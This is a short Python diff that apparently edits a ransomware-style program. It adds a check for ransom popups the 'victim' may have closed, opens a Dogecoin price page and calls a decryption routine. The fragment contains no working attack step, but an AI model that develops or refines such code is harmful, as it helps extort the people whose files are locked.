@@ -8,7 +8,8 @@ def link():
     webbrowser.open("https://www.binance.com/fr/price/dogecoin")
 
     for popup in popups:
-        popup.destroy()
+        if popup.winfo_exists():  # Cas où la victime a fermé des fenêtres
+            popup.destroy()
 
     decrypt_main()
     popup = tk.Tk()
